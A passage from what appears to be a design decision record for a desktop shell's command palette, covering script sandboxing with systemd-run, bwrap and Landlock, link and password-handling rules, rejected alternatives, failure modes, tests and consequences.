- **DA-9** A link whose resolved URL carries clipboard or selection data shows the full URL before opening, from every
  origin, and opens exactly what it showed (D-7); the link allowlist excludes custom scheme handlers and network file
  schemes.
- **DA-10** The shell is the one writer of `commands.json` and `commands-keys.lua` (D-8).
- **DA-11** Password arguments reach a script on stdin, never in argv (D-3).

## Alternatives considered
1. **A separate palette window beside Search** (Raycast's model). Rejected: two launchers with overlapping results, a second
   focus and lock path, and further from macOS 27.
2. **Run scripts with Quickshell `Process` directly.** Rejected: the script would live in the shell's cgroup (its memory limit
   and its crash domain), with no timeout kill of its children and no namespaces.
3. **Script confinement with bwrap alone.** Rejected: no resource limits and no whole-tree kill; systemd-run provides both, and
   bwrap inside it provides the namespaces.
4. **Scripts with the user's full rights by default (Raycast's behaviour).** Rejected: the owner's Q-2 answer would bind only
   Grassfield, while any script could still reach the network through the session bus or `systemd-run --user`.
5. **A JavaScript extension API in the shell.** Rejected by D-ext and by the shell's stability.
6. **Text expansion while typing** (compositor matcher, input method, or uinput). Removed by the owner's Q-1 answer.
7. **Text Replacements typed with wtype** (no clipboard). Rejected: the virtual keyboard types through the current layout, so
   characters the layout lacks and long texts come out wrong in some apps (docs/specs/clipboard.md, Emoji & Symbols known
   limitations); the targeted paste is exact and already reviewed.
8. **Forbid `{clipboard}` in web links.** Rejected for showing the expanded target first (D-7).
9. **libqalculate for dates, zones and units.** Rejected: a new dependency; its currency update reaches the network.
10. **Ollama via `curl` processes.** Rejected: a process per stream for no gain over XHR to loopback.

## Failure modes
- **No plugin:** window commands degrade as in tiling.md.
- **No bridge or a T0 app:** no menu-item rows.
- **systemd-run or bwrap refuses a property:** the script does not run; its row says "This script could not be started" and the
  journal says which property.
- **The approved hash does not match the bytes the runner read:** not run; Search asks for approval again.
- **Landlock below ABI 6, absent or refused:** no script runs at the Confined and Allow network levels ("This computer cannot
  confine scripts").
- **A script hangs:** killed at its limit; the row shows the failure.
- **Ollama absent, slow, or listening under another user's uid:** no AI rows; a running request times out after 60 s with a
  message; Stop aborts.
- **The previous clipboard cannot be restored:** the clipboard is cleared after the paste (D-5).
- **commands.json invalid:** Search shows no user content and Settings offers to keep the file aside (JsonSafety pattern).
- **A hotkey chord already taken after an Omarchy update:** `commands.lua` skips it and Settings marks it as a conflict.

## Tests
Per slice, in docs/specs/command-palette.md §4: L0 (pure JS, helper fakes), unit (QML TestCase, gtest), L1 nested at scale 1.25
with a screenshot path or "visual NOT verified", L2 for the owner. Opus security reviews: spec §4.4.

## Consequences
- 71 slices of at most a day across eight lanes (spec §4.1); the first owner-visible result (Actions on every row, the system
  and window commands, the main toggles) needs eight of them: P1, P2, P3a, P3b, P3c, S1, S3 and S6.
- New code stays in existing directories: `shell/search/`, `shell/platform/`, `apps/settings/`, `apps/clipboard-helper/` (the
  selection-owner answer), `ui/Grassfield/`, `config/hypr/grassfield/` (`commands.lua`), plus
  `packaging/bin/grassfield-script-run`.
- New IPC requests on the `search` target (`run <slot>`, the `CommandStore` item functions), one generated data file read as
  text by `commands.lua`, one user-content file and a few state files.
- No new run-time dependency, no new daemon, no compositor change.

Sources: as listed in docs/specs/command-palette.md ([R1]–[R22], [A1]–[A4], [P1]); read 2026-11-23.
